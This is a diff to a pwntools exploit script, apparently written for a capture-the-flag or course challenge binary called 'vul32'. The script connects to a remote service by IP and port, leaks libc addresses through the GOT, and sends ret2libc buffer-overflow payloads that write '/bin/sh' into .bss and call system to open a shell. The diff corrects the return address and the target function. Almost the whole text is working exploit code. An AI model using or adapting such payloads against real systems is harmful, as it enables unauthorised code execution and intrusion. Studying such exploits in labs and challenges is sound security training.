@@ -4,13 +4,14 @@ from pwn import *
 WRITE_LIBC_ADDR = 0x000d43c0
 GETS_LIBC_ADDR = 0x0005e890
 SYSTEM_LIBC_ADDR = 0x0003a940
-STR_ADDR = 0x804a088            # completed
+STR_ADDR = 0x804a088            # completed in .bss 
+VUL_RET_ADDR = 0x80486bf        # ret addr of dovuln
 
 #sh = process('./vul32')
 sh = remote('202.112.51.154', 20001)
 elf = ELF('./vul32')
 
-dovuln_addr = elf.symbols['main']
+dovuln_addr = elf.symbols['dovuln']
 write_addr = elf.plt['write']
 print elf.got
 write_got = elf.got['write']
@@ -51,8 +52,8 @@ print "system addr 0x%x\n" % system_addr
 print "gets /bin/sh"
 payload = flat([    \
     'G'* 52,        \
-    gets_addr,    \
-    dovuln_addr,     \
+    gets_addr,      \
+    dovuln_addr,    \
     STR_ADDR      
     ])
 
@@ -68,7 +69,7 @@ print "hacking"
 payload = flat([    \
     'G'* 52,        \
     system_addr,    \
-    0xABBABAAB,     \
+    VUL_RET_ADDR,   \
     STR_ADDR      
     ])
 sh.sendline(payload)
